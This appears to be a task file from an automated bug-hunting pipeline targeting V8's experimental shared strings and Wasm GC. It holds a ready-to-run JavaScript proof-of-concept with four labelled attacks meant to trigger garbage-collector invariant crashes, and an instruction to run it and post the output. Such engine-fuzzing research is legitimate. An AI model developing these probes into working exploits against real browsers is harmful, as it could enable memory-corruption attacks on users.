# Genome 055 — gc-exploit-shared-leak-v2

## Hypothesis
TC-003 confirmed: shared strings leak to JS through the compiled wrapper after tier-up. The previous gc-exploit attempt (genome 053) found that the marking barrier early-returns at line 67 of marking-barrier-inl.h prevent DCHECK for shared-space objects being written directly. This means normal write-barrier-based detection is bypassed.

**New attack angles:**

1. **Ephemeron tables (WeakMap/WeakSet):** WeakMap uses ephemeron tables for GC. If a leaked shared string is used as a WeakMap KEY (not value), the ephemeron marking logic at `MarkingVisitor::VisitEphemeronHashTable` may not expect shared-space keys. The DCHECK at marking-visitor-inl.h:704 (`DCHECK(!HeapLayout::InWritableSharedSpace(key))`) should fire.

2. **String table deduplication:** V8's string table deduplicates strings during GC. If a leaked shared string and a local string with the same content coexist, the string table internalization logic may try to deduplicate them, creating a cross-space reference.

3. **Concurrent GC marking race:** If the local GC concurrent marker encounters a leaked shared string in the local heap's remembered set, it may try to mark through it into shared space, violating the GC's space boundary invariants.

4. **Scavenger (minor GC):** Young generation GC (scavenger) should never encounter shared-space objects. If a leaked shared string is stored in a young-gen object's field, the scavenger may try to evacuate or forward it.

Multi-factor: [shared string leak via compiled wrapper] × [specific GC data structure] × [cross-space invariant violation] = DCHECK/crash.

## DNA

### Source Facts — GC Space Boundaries
```cpp
// marking-barrier-inl.h:67 — early return for shared space objects
if (HeapLayout::InWritableSharedSpace(value)) return;  // Skip local marking

// marking-visitor-inl.h:704 — ephemeron key check
DCHECK(!HeapLayout::InWritableSharedSpace(key));  // Keys must be local

// new-space.cc — scavenger assumes all objects are local space
// string-table.cc — internalization/deduplication logic
```

### Previous Attempt Results (genome 053)
- Direct WeakRef/FinalizationRegistry: no crash (shared strings are valid targets)
- Direct string operations: no crash (string ops work on shared strings)
- Heavy GC with 1000 leaked strings: no crash (marking barrier early-returns)
- KEY FINDING: marking barrier skips shared objects, so write barriers don't trigger DCHECKs

### What's Different This Time
- Focus on EPHEMERON tables (WeakMap keys), not WeakRef/FinalizationRegistry
- Focus on STRING TABLE internalization, not general GC
- Focus on SCAVENGER (minor GC), not just major GC
- Test from WORKERS (SharedArrayBuffer) for concurrent access

## Ready-to-Run Test

```javascript
// Flags: --experimental-wasm-shared --allow-natives-syntax --shared-string-table --harmony-struct
load('/Users/t/v8/test/mjsunit/wasm/wasm-module-builder.js');

// Create shared string
let ss = new (new SharedStructType(['s']));
ss.s = 'gc-exploit-v2-test-string-long-enough-to-avoid-internalization';
let sharedStr = ss.s;

function tierUp(fn, arg) { for (let i = 0; i < 15000; i++) fn(arg); }

// Build Wasm module to leak shared strings
let b = new WasmModuleBuilder();
b.addFunction('leak', makeSig([kWasmExternRef], [kWasmExternRef]))
  .addBody([kExprLocalGet, 0]).exportFunc();
let inst = b.instantiate();

// Tier up to trigger compiled wrapper (which leaks shared strings)
tierUp(inst.exports.leak, sharedStr);
let leaked = inst.exports.leak(sharedStr);
print('Setup: isShared=' + %IsSharedString(leaked));

// ATTACK 1: Ephemeron table — leaked shared string as WeakMap KEY
try {
  let wm = new WeakMap();
  // WeakMap keys must be objects, not strings
  // But leaked shared strings might bypass the check?
  // Actually: WeakMap requires object keys. Let's use a different approach.
  // Wrap the leaked string in a shared struct, then use THAT as a key
  // Actually, let's leak a WasmStruct instead and use it as WeakMap key
  print('ATTACK1: WeakMap with shared string — strings cannot be WeakMap keys');
  print('ATTACK1: Trying WeakSet with leaked shared struct instead...');

  // Build module that leaks shared struct
  let b2 = new WasmModuleBuilder();
  let kSharedAnyRef = wasmRefNullType(kWasmAnyRef).shared();
  let kSharedExternRef = wasmRefNullType(kWasmExternRef).shared();
  let st = b2.addStruct({fields: [makeField(kWasmI32, true)], shared: true});
  let stRef = wasmRefType(st).shared();

  b2.addFunction('make_shared_struct', makeSig([], [kSharedExternRef]))
    .addBody([
      kExprI32Const, 42,
      kGCPrefix, kExprStructNew, st,
      kGCPrefix, kExprExternConvertAny
    ]).exportFunc();

  let inst2 = b2.instantiate();
  tierUp(inst2.exports.make_shared_struct);
  let leakedStruct = inst2.exports.make_shared_struct();
  print('Leaked shared struct: ' + typeof leakedStruct);

  // WeakSet with leaked shared struct
  let ws = new WeakSet();
  ws.add(leakedStruct);
  print('WeakSet.add(leakedStruct): success');
  %CollectGarbage('major');
  print('After major GC: WeakSet.has=' + ws.has(leakedStruct));
  %CollectGarbage('major');
  %CollectGarbage('major');
  print('After 3x major GC: WeakSet.has=' + ws.has(leakedStruct));
} catch(e) { print('ATTACK1 ERROR: ' + e.message); }

// ATTACK 2: String table internalization race
try {
  leaked = inst.exports.leak(sharedStr);
  // Create a LOCAL string with the same content as the shared string
  let localStr = 'gc-exploit-v2-test-string-long-enough-to-avoid-internalization';
  print('ATTACK2: local===leaked: ' + (localStr === leaked));
  print('ATTACK2: isShared(local)=' + %IsSharedString(localStr));
  print('ATTACK2: isShared(leaked)=' + %IsSharedString(leaked));

  // Force string table lookup by using as property key
  let obj = {};
  obj[leaked] = 1;
  obj[localStr] = 2;
  print('ATTACK2: obj[leaked]=' + obj[leaked] + ' obj[localStr]=' + obj[localStr]);

  // Force internalization
  for (let i = 0; i < 100; i++) {
    let key = leaked + '';  // String concatenation might trigger representation change
    obj[key] = i;
  }
  %CollectGarbage('major');
  print('ATTACK2: After internalization + GC: no crash');
} catch(e) { print('ATTACK2 ERROR: ' + e.message); }

// ATTACK 3: Minor GC (scavenger) with leaked shared string in young-gen object
try {
  // Allocate a young-gen object holding the leaked shared string
  for (let i = 0; i < 100; i++) {
    leaked = inst.exports.leak(sharedStr);
    let arr = [leaked, leaked, leaked];  // young-gen array
    %CollectGarbage('minor');  // scavenger should encounter shared string ref
  }
  print('ATTACK3: 100 minor GCs with leaked shared strings: no crash');
} catch(e) { print('ATTACK3 ERROR: ' + e.message); }

// ATTACK 4: Massive allocation pressure + leaked strings to trigger compaction
try {
  let holders = [];
  for (let i = 0; i < 5000; i++) {
    let s = new (new SharedStructType(['s']));
    s.s = 'mass-leak-' + i + '-' + Math.random().toString(36).substring(2);
    holders.push({leaked: inst.exports.leak(s.s), original: s.s});
  }
  print('ATTACK4: Created 5000 leaked shared strings');
  // Trigger compaction by allocating more
  for (let i = 0; i < 10; i++) {
    %CollectGarbage('major');
    let arr = new Array(10000).fill(0).map((_, j) => 'filler-' + j);
  }
  // Verify integrity
  let corrupted = 0;
  for (let i = 0; i < holders.length; i++) {
    if (typeof holders[i].leaked !== 'string') corrupted++;
    else if (holders[i].leaked !== holders[i].original) corrupted++;
  }
  print('ATTACK4: Corrupted after compaction: ' + corrupted + '/' + holders.length);
} catch(e) { print('ATTACK4 ERROR: ' + e.message); }

print('ALL ATTACKS COMPLETE');
```

## Evolution Plan
- v1: Run the test. Any crash/DCHECK = confirmed exploit.
- v2: If no crash, audit scavenger code for shared-space object handling. Check if scavenger has InWritableSharedSpace guards.
- v3: If still clean, try worker-based concurrent access (SharedArrayBuffer + postMessage with leaked shared struct).

## Task
**RUN THE TEST FIRST.** Save to `/tmp/gc_exploit_v2.js` and execute. Post ALL output. Any crash or DCHECK failure is a confirmed exploit. Focus on ATTACK 1 (WeakSet with shared struct) and ATTACK 3 (minor GC scavenger).

Post with tags `gc-exploit,shared-string,shared-struct,weakset,scavenger,tc-003`.
